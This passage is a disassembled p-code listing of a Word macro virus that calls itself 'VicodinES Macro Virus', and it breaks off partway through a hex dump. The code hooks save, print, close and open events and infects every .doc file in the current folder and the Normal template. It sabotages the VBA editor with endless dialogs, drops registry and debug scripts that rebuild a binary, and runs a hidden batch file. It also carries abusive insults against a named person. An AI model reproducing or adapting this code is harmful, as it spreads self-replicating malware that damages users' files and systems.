' 	ArgsMemCall SaveAs 0x0002 
' 	EndIf 
' Line #46:
' 	Ld NormInstall 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #47:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #48:
' 	EndIfBlock 
' Line #49:
' 	Ld Application 
' 	MemLd ShowVisualBasicEditor 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) out 0x0000 
' 	EndIf 
' Line #50:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #51:
' 	Ld Application 
' 	MemLd ShowVisualBasicEditor 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) out 0x0000 
' 	EndIf 
' Line #52:
' 	Label fuckoff 
' Line #53:
' 	EndSub 
' Line #54:
' 	FuncDefn (Sub HelpAbout())
' Line #55:
' 	OnError (Resume Next) 
' Line #56:
' 	LitStr 0x0018 "Linda Tripp is a WHORE!!"
' 	Ld vbInformation 
' 	LitStr 0x0015 "VicodinES Macro Virus"
' 	ArgsCall MsgBox 0x0003 
' Line #57:
' 	EndSub 
' Line #58:
' 	FuncDefn (Sub FileSave())
' Line #59:
' 	OnError (Resume Next) 
' Line #60:
' 	Ld Application 
' 	MemLd ShowVisualBasicEditor 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) out 0x0000 
' 	EndIf 
' Line #61:
' 	ArgsCall (Call) Steroid 0x0000 
' Line #62:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #63:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #64:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #65:
' 	EndSub 
' Line #66:
' 	FuncDefn (Sub FileSaveAs())
' Line #67:
' 	OnError (Resume Next) 
' Line #68:
' 	Ld Application 
' 	MemLd ShowVisualBasicEditor 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) out 0x0000 
' 	EndIf 
' Line #69:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #70:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #71:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #72:
' 	ArgsCall (Call) Steroid 0x0000 
' Line #73:
' 	EndSub 
' Line #74:
' 	FuncDefn (Sub FilePrint())
' Line #75:
' 	OnError (Resume Next) 
' Line #76:
' 	Ld Application 
' 	MemLd ShowVisualBasicEditor 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) out 0x0000 
' 	EndIf 
' Line #77:
' 	Ld wdDialogFilePrint 
' 	ArgsLd dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #78:
' 	ArgsCall (Call) Steroid 0x0000 
' Line #79:
' 	EndSub 
' Line #80:
' 	FuncDefn (Sub FileClose())
' Line #81:
' 	OnError (Resume Next) 
' Line #82:
' 	Ld Application 
' 	MemLd ShowVisualBasicEditor 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) out 0x0000 
' 	EndIf 
' Line #83:
' 	ArgsCall (Call) Steroid 0x0000 
' Line #84:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #85:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #86:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #87:
' 	EndSub 
' Line #88:
' 	FuncDefn (Sub FileExit())
' Line #89:
' 	OnError (Resume Next) 
' Line #90:
' 	Ld Application 
' 	MemLd ShowVisualBasicEditor 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) out 0x0000 
' 	EndIf 
' Line #91:
' 	ArgsCall (Call) Caffeine 0x0000 
' Line #92:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #93:
' 	EndSub 
' Line #94:
' 	FuncDefn (Sub AutoOpen())
' Line #95:
' 	OnError (Resume Next) 
' Line #96:
' 	Ld Application 
' 	MemLd ShowVisualBasicEditor 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) out 0x0000 
' 	EndIf 
' Line #97:
' 	ArgsCall (Call) Steroid 0x0000 
' Line #98:
' 	EndSub 
' Line #99:
' 	FuncDefn (Sub AutoExit())
' Line #100:
' 	OnError (Resume Next) 
' Line #101:
' 	Ld Application 
' 	MemLd ShowVisualBasicEditor 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) out 0x0000 
' 	EndIf 
' Line #102:
' 	ArgsCall (Call) Caffeine 0x0000 
' Line #103:
' 	EndSub 
' Line #104:
' 	FuncDefn (Sub AutoClose())
' Line #105:
' 	OnError (Resume Next) 
' Line #106:
' 	Ld Application 
' 	MemLd ShowVisualBasicEditor 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) out 0x0000 
' 	EndIf 
' Line #107:
' 	ArgsCall (Call) Steroid 0x0000 
' Line #108:
' 	EndSub 
' Line #109:
' 	FuncDefn (Sub ViewVBCode())
' Line #110:
' 	OnError (Resume Next) 
' Line #111:
' 	Ld Application 
' 	MemLd ShowVisualBasicEditor 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) out 0x0000 
' 	EndIf 
' Line #112:
' 	EndSub 
' Line #113:
' 	FuncDefn (Sub Caffeine())
' Line #114:
' 	QuoteRem 0x0000 0x0033 " If Application.ShowVisualBasicEditor Then Call out"
' Line #115:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #116:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #117:
' 	Ld wdWindowStateMinimize 
' 	Ld Application 
' 	MemSt WindowState 
' Line #118:
' 	Ld CurDir 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	St pName 
' Line #119:
' 	Ld pName 
' 	LitStr 0x0005 "*.doc"
' 	Concat 
' 	Ld sAttr 
' 	ArgsLd Dir 0x0002 
' 	St fName 
' Line #120:
' 	Ld fName 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	Ld fName 
' 	LitStr 0x0001 "."
' 	Ne 
' 	Paren 
' 	Ld fName 
' 	LitStr 0x0002 ".."
' 	Ne 
' 	Paren 
' 	And 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld pName 
' 	Ld fName 
' 	Concat 
' 	St InfectDoc 
' 	EndIf 
' Line #121:
' 	Ld InfectDoc 
' 	ParamNamed FileName 
' 	LitVarSpecial (False)
' 	ParamNamed ConfirmConversions 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnly 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitStr 0x0000 ""
' 	ParamNamed PasswordDocument 
' 	Ld Documents 
' 	ArgsMemCall Option 0x0005 
' Line #122:
' 	Ld fName 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	DoWhile 
' Line #123:
' 	ArgsLd Dir 0x0000 
' 	St fName 
' Line #124:
' 	LineCont 0x0004 07 00 00 00
' 	Ld fName 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	Ld fName 
' 	LitStr 0x0001 "."
' 	Ne 
' 	Paren 
' 	Ld fName 
' 	LitStr 0x0002 ".."
' 	Ne 
' 	Paren 
' 	And 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #125:
' 	Ld pName 
' 	Ld fName 
' 	Concat 
' 	St InfectDoc 
' Line #126:
' 	Ld InfectDoc 
' 	ParamNamed FileName 
' 	LitVarSpecial (False)
' 	ParamNamed ConfirmConversions 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnly 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitStr 0x0000 ""
' 	ParamNamed PasswordDocument 
' 	Ld Documents 
' 	ArgsMemCall Option 0x0005 
' Line #127:
' 	ArgsCall (Call) Steroid 0x0000 
' Line #128:
' 	EndIfBlock 
' Line #129:
' 	Loop 
' Line #130:
' 	EndSub 
' Line #131:
' 	FuncDefn (Sub out())
' Line #132:
' 	LitVarSpecial (False)
' 	St ShowVisualBasicEditor 
' Line #133:
' 	ArgsCall Read 0x0000 
' Line #134:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #135:
' 	OnError (Resume Next) 
' Line #136:
' 	LitVarSpecial (False)
' 	St ShowVisualBasicEditor 
' Line #137:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #138:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #139:
' 	ArgsCall (Call) Caffeine 0x0000 
' Line #140:
' 	LitDI2 0x0001 
' 	St X 
' Line #141:
' 	Ld X 
' 	LitDI2 0x0001 
' 	Eq 
' 	DoWhile 
' Line #142:
' 	Ld rnd 
' 	LitDI2 0x02BC 
' 	Mul 
' 	FnInt 
' 	St testicle 
' Line #143:
' 	Ld testicle 
' 	ArgsLd dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #144:
' 	Loop 
' Line #145:
' 	EndSub 
' Line #146:
' Line #147:
' 	FuncDefn (Sub Mover1())
' Line #148:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0005 "Whore"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectCommandBars 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #149:
' 	EndSub 
' Line #150:
' Line #151:
' 	FuncDefn (Sub Mover2())
' Line #152:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0005 "Whore"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectCommandBars 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #153:
' 	EndSub 
' Line #154:
' Line #155:
' 	FuncDefn (Sub Tripp())
' Line #156:
' 	LitStr 0x000C "c:\tripp.reg"
' 	ArgsCall (Call) Drop_reg 0x0001 
' Line #157:
' 	LitStr 0x000C "C:\start.scr"
' 	ArgsCall (Call) Drop_bmp 0x0001 
' Line #158:
' 	LitStr 0x000D "c:\mstart.bat"
' 	ArgsCall (Call) make_bmp 0x0001 
' Line #159:
' 	EndSub 
' Line #160:
' Line #161:
' 	FuncDefn (Sub Drop_reg(strFile As String))
' Line #162:
' 	Dim 
' 	VarDefn hFile (As Long)
' Line #163:
' 	Ld hFile 
' 	Close 0x0001 
' Line #164:
' 	OnError (Resume Next) 
' Line #165:
' 	Ld Friend 
' 	St hFile 
' Line #166:
' 	Ld strFile 
' 	Ld hFile 
' 	LitDefault 
' 	Open (For Output Access Write)
' Line #167:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "REGEDIT4"
' 	PrintItemNL 
' Line #168:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #169:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0028 "[HKEY_CURRENT_USER\Control Panel\Colors]"
' 	PrintItemNL 
' Line #170:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001A ""Background"="255 255 255""
' 	PrintItemNL 
' Line #171:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #172:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002B "[HKEY_USERS\.Default\Control Panel\desktop]"
' 	PrintItemNL 
' Line #173:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0017 ""Wallpaper"="Tripp.bmp""
' 	PrintItemNL 
' Line #174:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #175:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0044 "[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Setup]"
' 	PrintItemNL 
' Line #176:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0017 ""Wallpaper"="tripp.bmp""
' 	PrintItemNL 
' Line #177:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #178:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0001 ""
' 	PrintItemNL 
' Line #179:
' 	Ld hFile 
' 	Close 0x0001 
' Line #180:
' 	EndSub 
' Line #181:
' Line #182:
' 	FuncDefn (Sub make_bmp(strFile As String))
' Line #183:
' 	Dim 
' 	VarDefn hFile (As Long)
' Line #184:
' 	Ld hFile 
' 	Close 0x0001 
' Line #185:
' 	OnError (Resume Next) 
' Line #186:
' 	Ld Friend 
' 	St hFile 
' Line #187:
' 	Ld strFile 
' 	Ld hFile 
' 	LitDefault 
' 	Open (For Output Access Write)
' Line #188:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@echo off"
' 	PrintItemNL 
' Line #189:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "cd\"
' 	PrintItemNL 
' Line #190:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0017 "debug < start.scr > nul"
' 	PrintItemNL 
' Line #191:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0018 "copy tripp.com tripp.bmp"
' 	PrintItemNL 
' Line #192:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000D "del tripp.com"
' 	PrintItemNL 
' Line #193:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000D "del start.scr"
' 	PrintItemNL 
' Line #194:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0019 "copy tripp.bmp c:\windows"
' 	PrintItemNL 
' Line #195:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0017 "copy tripp.bmp c:\winnt"
' 	PrintItemNL 
' Line #196:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000D "del tripp.bmp"
' 	PrintItemNL 
' Line #197:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0020 "start /m /w regedit /S tripp.reg"
' 	PrintItemNL 
' Line #198:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000D "del tripp.reg"
' 	PrintItemNL 
' Line #199:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "del mstart.bat"
' 	PrintItemNL 
' Line #200:
' 	Ld hFile 
' 	Close 0x0001 
' Line #201:
' 	LitStr 0x000D "c:\mstart.bat"
' 	Paren 
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #202:
' 	EndSub 
' Line #203:
' Line #204:
' 	FuncDefn (Sub Drop_bmp(strFile As String))
' Line #205:
' 	OnError (Resume Next) 
' Line #206:
' 	Dim 
' 	VarDefn hFile (As Long)
' Line #207:
' 	Ld Friend 
' 	St hFile 
' Line #208:
' 	Ld strFile 
' 	Ld hFile 
' 	LitDefault 
' 	Open (For Output Access Write)
' Line #209:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "N TRIPP.COM"
' 	PrintItemNL 
' Line #210:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0037 "E 0100 42 4D 26 D9 00 00 00 00 00 00 36 00 00 00 28 00 "
' 	PrintItemNL 
' Line #211:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0110 00 00 76 00 00 00 9C 00 00 00 01 00 18 00 00 00"
' 	PrintItemNL 
' Line #212:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0120 00 00 F0 D8 00 00 13 0B 00 00 13 0B 00 00 00 00"
' 	PrintItemNL 
' Line #213:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0130 00 00 00 00 00 00 FD FD FD FC FC FC FB FB FB F9"
' 	PrintItemNL 
' Line #214:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0140 F9 F9 F8 F8 F8 F7 F7 F7 F7 F7 F7 F6 F6 F6 F4 F6"
' 	PrintItemNL 
' Line #215:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0150 F7 F4 F6 F7 F4 F6 F7 F4 F6 F7 F4 F6 F7 F4 F6 F7"
' 	PrintItemNL 
' Line #216:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0160 F4 F6 F7 F4 F6 F7 F2 F5 F9 F2 F5 F9 F2 F5 F9 F2"
' 	PrintItemNL 
' Line #217:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0170 F5 F9 F2 F5 F9 F2 F5 F9 F2 F5 F9 F2 F5 F9 F2 F5"
' 	PrintItemNL 
' Line #218:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0180 F9 F2 F5 F9 F2 F5 F9 F2 F5 F9 F2 F5 F9 F2 F5 F9"
' 	PrintItemNL 
' Line #219:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0190 F2 F5 F9 F1 F6 F9 EF F6 F9 ED F6 F9 F1 F6 F9 F1"
' 	PrintItemNL 
' Line #220:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 01A0 F6 F9 F4 F4 FA F4 F4 FA F4 F4 FA F2 F5 FA F2 F5"
' 	PrintItemNL 
' Line #221:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 01B0 FA F1 F6 F9 F1 F6 F9 F2 F6 F7 F4 F6 F6 F6 F6 F6"
' 	PrintItemNL 
' Line #222:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 01C0 FA F6 F5 FA F6 F5 FA F5 F6 FA F5 F6 FA F5 F6 FA"
' 	PrintItemNL 
' Line #223:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 01D0 F5 F6 F8 F6 F6 F8 F6 F6 F8 F6 F6 F8 F6 F6 F6 F6"
' 	PrintItemNL 
' Line #224:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 01E0 F6 F6 F6 F6 F6 F6 F6 F6 F6 F6 F4 F6 F6 F4 F6 F6"
' 	PrintItemNL 
' Line #225:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 01F0 F4 F6 F6 F4 F6 F6 F4 F5 F9 F4 F5 F9 F4 F5 F9 F4"
' 	PrintItemNL 
' Line #226:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0200 F5 F9 F4 F6 F7 F4 F6 F7 F4 F6 F7 F4 F6 F7 F6 F6"
' 	PrintItemNL 
' Line #227:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0210 F6 F6 F6 F6 F6 F6 F6 F6 F6 F6 F6 F7 F5 F6 F7 F5"
' 	PrintItemNL 
' Line #228:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0220 F6 F7 F5 F6 F7 F5 F6 F6 F6 F4 F6 F6 F4 F6 F7 F1"
' 	PrintItemNL 
' Line #229:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0230 F6 F7 F1 F6 F9 EF F6 F9 F1 F6 F9 F1 F6 F9 F4 F5"
' 	PrintItemNL 
' Line #230:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0240 F9 F4 F6 F7 F6 F5 F7 F6 F6 F6 F4 F7 F5 F2 F7 F5"
' 	PrintItemNL 
' Line #231:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0250 F2 F8 F3 F1 F8 F5 F1 F6 F7 F1 F6 F9 F1 F6 F9 F1"
' 	PrintItemNL 
' Line #232:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0260 F6 F9 F2 F5 F9 F2 F5 F9 F2 F5 F9 F2 F5 F9 F4 F5"
' 	PrintItemNL 
' Line #233:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0270 F9 F4 F5 F9 F4 F5 F9 F4 F5 F9 F6 F5 F9 F6 F5 F9"
' 	PrintItemNL 
' Line #234:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0280 F6 F5 F9 F4 F5 F9 F3 F5 F6 F5 F9 FA EF F3 F4 F9"
' 	PrintItemNL 
' Line #235:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0290 FD FE FB FF FF FB FF FF 00 00 FF FF FF FD FD FD"
' 	PrintItemNL 
' Line #236:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 02A0 F9 F9 F9 F6 F6 F6 F2 F2 F2 F0 F0 F0 EF EF EF EF"
' 	PrintItemNL 
' Line #237:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 02B0 EF EF EC EE EF EC EE EF EC EE EF EC EE EE EE ED"
' 	PrintItemNL 
' Line #238:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 02C0 EF EC EE EE EE ED EF EC EE EF EC EE EF EA ED F1"
' 	PrintItemNL 
' Line #239:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 02D0 EC ED F1 EA ED F1 EC ED F1 EA ED F1 EC ED F1 EA"
' 	PrintItemNL 
' Line #240:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 02E0 ED F1 EC ED F1 EA ED F1 EC ED F1 EA ED F1 EC ED"
' 	PrintItemNL 
' Line #241:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 02F0 F1 EA ED F1 EC ED F1 EA ED F1 E7 EE F1 E7 EE F1"
' 	PrintItemNL 
' Line #242:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0300 E9 EE F1 EA ED F1 EC EC F2 EC EC F2 EE EC F2 EC"
' 	PrintItemNL 
' Line #243:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0310 EC F2 EA ED F2 EA ED F1 E9 EE EF EA EE EF EC EE"
' 	PrintItemNL 
' Line #244:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0320 EE EE EF ED F0 EE ED F2 EE ED F2 ED EE F2 ED EE"
' 	PrintItemNL 
' Line #245:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0330 F2 ED EE F0 EE EE F0 EE EE F0 EE EE F0 EE EE EE"
' 	PrintItemNL 
' Line #246:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0340 EE EE EE EE EE EE EE EE EE EE EE EC EE EE EC EE"
' 	PrintItemNL 
' Line #247:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0350 EE EC EE EE EC EE EE EC EE EE EC EE EF EC ED F1"
' 	PrintItemNL 
' Line #248:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0360 EE ED F1 EC EE EF EE ED EF EC EE EF EC EE EF EC"
' 	PrintItemNL 
' Line #249:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0370 EE EE EE EE EE EE EE EE EE EE EE EE EF ED EE EF"
' 	PrintItemNL 
' Line #250:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0380 ED EE EF ED EE EF ED EE EF ED EE EE EE EC EE EE"
' 	PrintItemNL 
' Line #251:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0390 EC EE EF EA EE EF E9 EE F1 E9 EE F1 E9 EE F1 EA"
' 	PrintItemNL 
' Line #252:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 03A0 ED F1 EC ED F1 EE ED EF EE EE EE EE EF ED EC EF"
' 	PrintItemNL 
' Line #253:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 03B0 ED EA F0 EB E9 F0 EB E9 F0 ED EA EE EF EA ED F1"
' 	PrintItemNL 
' Line #254:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 03C0 EA ED F1 EA ED F1 EA ED F1 EC ED F1 EC ED F1 EC"
' 	PrintItemNL 
' Line #255:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 03D0 ED F1 EC ED F1 EE ED F1 EE ED F1 EE ED F1 EE ED"
' 	PrintItemNL 
' Line #256:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 03E0 F1 EE ED F1 F0 EC F1 EE ED F1 EB ED EE EC F0 F1"
' 	PrintItemNL 
' Line #257:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 03F0 E9 EB EC FB FF FF FD FF FF FB FF FF 00 00 FD FD"
' 	PrintItemNL 
' Line #258:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0400 FD F9 F9 F9 F3 F3 F3 EC EC EC E6 E6 E6 E2 E2 E2"
' 	PrintItemNL 
' Line #259:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0410 E0 E0 E0 DF DF DF DF DF DF DF DF DF DF DF DF DF"
' 	PrintItemNL 
' Line #260:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0420 E0 DE E1 DF DF DF E0 DE E1 DF DF DF DF DF DF DE"
' 	PrintItemNL 
' Line #261:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0430 E0 DD DF E0 DF DE E0 DD DF E0 DF DE E0 DD DF E0"
' 	PrintItemNL 
' Line #262:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0440 DF DE E0 DD DF E0 DF DE E0 DD DF E0 DF DE E0 DD"
' 	PrintItemNL 
' Line #263:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0450 DF E0 DF DE E0 DD DF E0 DF DE E0 DD DF E0 DA DF"
' 	PrintItemNL 
' Line #264:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0460 E0 D8 E0 E0 DA DF E0 DB DF E0 DF DE E2 DF DE E2"
' 	PrintItemNL 
' Line #265:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0470 E1 DD E3 DF DD E3 DF DE E2 DD DE E2 DB DF E0 DB"
' 	PrintItemNL 
' Line #266:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0480 DF E0 DD DF DF DF E0 DE DF E0 DE E1 DF DE E1 DF"
' 	PrintItemNL 
' Line #267:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0490 DF E1 DF DF E1 DF DF E1 DF DF E1 DF DF DF DF DF"
' 	PrintItemNL 
' Line #268:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 04A0 DF DF DF DF DF DF DF DF DF DD DF DF DD DF DF DD"
' 	PrintItemNL 
' Line #269:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 04B0 DF DF DD DF DF DB E0 DF DB E0 DF DD DF DF DF DE"
' 	PrintItemNL 
' Line #270:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 04C0 E0 DF DE E0 E1 DE E0 DF DE E0 E1 DE E0 DF DF DF"
' 	PrintItemNL 
' Line #271:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 04D0 DF DF DF DF DF DF DF DF DF DF E0 DE DF E0 DE DF"
' 	PrintItemNL 
' Line #272:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
